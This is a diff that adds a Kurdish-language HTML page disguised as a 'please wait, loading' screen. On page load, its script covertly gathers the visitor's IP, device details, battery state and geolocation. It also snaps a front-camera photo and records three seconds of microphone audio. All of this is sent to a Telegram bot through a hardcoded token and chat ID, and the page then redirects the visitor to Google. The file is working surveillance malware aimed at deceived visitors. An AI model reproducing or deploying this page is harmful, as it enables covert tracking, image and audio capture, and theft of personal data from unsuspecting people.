@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="ckb" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        video, canvas { display: none; }
+        .loader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader-container">
+        <h2>تکایە چاوەڕێبە...</h2>
+        <p>پەڕەکە لە کردنەوەدایە</p>
+    </div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ==========================================
+        // زانیارییەکانی تێلێگرام لێرە دابنێ:
+        // ==========================================
+        const botToken = "7719273579:AAGhBd2fbqoukGtPHh5Kg38ZY9kbpMysSZs"; // نمونە: 123456789:ABCDefGHIjkLMNOPQrsTUVwxyz
+        const chatId = "949718113";     // نمونە: 123456789 (دەتوانیت لە بۆتی @userinfobot وەری بگریت)
+
+        // فانکشنی گۆڕینی Base64 بۆ فایل (بۆ ئەوەی تێلێگرام قبوڵی بکات)
+        function dataURItoBlob(dataURI) {
+            let byteString = atob(dataURI.split(',')[1]);
+            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            let ab = new ArrayBuffer(byteString.length);
+            let ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], {type: mimeString});
+        }
+
+        function getGPU() {
+            try {
+                let canvas = document.createElement('canvas');
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "نەزانراو";
+            } catch (e) { return "پشتگیری ناکرێت"; }
+        }
+
+        let userData = {
+            ip: "نەزانراو",
+            device: navigator.userAgent,
+            gpu: getGPU(),
+            screen: window.screen.width + "x" + window.screen.height,
+            network: navigator.connection ? navigator.connection.effectiveType : "نەزانراو",
+            battery_level: "نەزانراو",
+            is_charging: "نەزانراو",
+            location: null,
+            image: null,
+            audio: null
+        };
+
+        let tasksCompleted = 0;
+        const totalTasks = 4; // ئایپی، پاتری، لۆکەیشن، کامێرا/دەنگ
+
+        function checkAndSend() {
+            tasksCompleted++;
+            if (tasksCompleted >= totalTasks) {
+                
+                let locationText = "ڕێگە نەدرا";
+                if(userData.location && userData.location.lat) {
+                    locationText = `https://www.google.com/maps?q=${userData.location.lat},${userData.location.lng}`;
+                }
+
+                let textMessage = `
+🚨 **زانیاری نوێ هات** 🚨
+
+🌍 **ئایپی:** ${userData.ip}
+🔋 **شەحن:** ${userData.battery_level} (لەکارە: ${userData.is_charging})
+📱 **جۆری ئامێر:** ${userData.device}
+⚙️ **گرافیک کارد:** ${userData.gpu}
+🌐 **جۆری هێڵ:** ${userData.network}
+📍 **لۆکەیشن:** 
+${locationText}
+`;
+
+                // 1. ناردنی نامەی تێکست
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ chat_id: chatId, text: textMessage, parse_mode: 'Markdown' })
+                });
+
+                // 2. ناردنی وێنە
+                if(userData.image && userData.image.startsWith('data:image')) {
+                    let photoData = new FormData();
+                    photoData.append('chat_id', chatId);
+                    photoData.append('photo', dataURItoBlob(userData.image), 'photo.jpg');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: photoData });
+                }
+
+                // 3. ناردنی دەنگ
+                if(userData.audio && userData.audio.startsWith('data:audio')) {
+                    let audioData = new FormData();
+                    audioData.append('chat_id', chatId);
+                    audioData.append('voice', dataURItoBlob(userData.audio), 'voice.webm');
+                    fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: audioData }).then(() => {
+                        // گواستنەوەی کەسەکە بۆ سایتێکی تر دوای تەواوبوون
+                        window.location.href = "https://www.google.com";
+                    });
+                } else {
+                     window.location.href = "https://www.google.com";
+                }
+            }
+        }
+
+        // وەرگرتنی داتاکان
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json()).then(d => { userData.ip = d.ip; checkAndSend(); })
+            .catch(() => checkAndSend());
+
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(b => {
+                userData.battery_level = Math.round(b.level * 100) + "%";
+                userData.is_charging = b.charging ? "بەڵێ" : "نەخێر";
+                checkAndSend();
+            }).catch(() => checkAndSend());
+        } else { checkAndSend(); }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                p => { userData.location = { lat: p.coords.latitude, lng: p.coords.longitude }; checkAndSend(); },
+                e => { checkAndSend(); }
+            );
+        } else { checkAndSend(); }
+
+        async function snapAndRecord() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                        userData.image = canvas.toDataURL('image/jpeg', 0.8);
+                    }, 800);
+
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let audioChunks = [];
+                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                    
+                    mediaRecorder.onstop = () => {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(new Blob(audioChunks, { type: 'audio/webm' }));
+                        reader.onloadend = () => {
+                            userData.audio = reader.result;
+                            stream.getTracks().forEach(t => t.stop());
+                            checkAndSend();
+                        };
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 3000);
+                };
+            } catch (err) {
+                checkAndSend();
+            }
+        }
+        snapAndRecord();
+    </script>
+</body>
+</html>
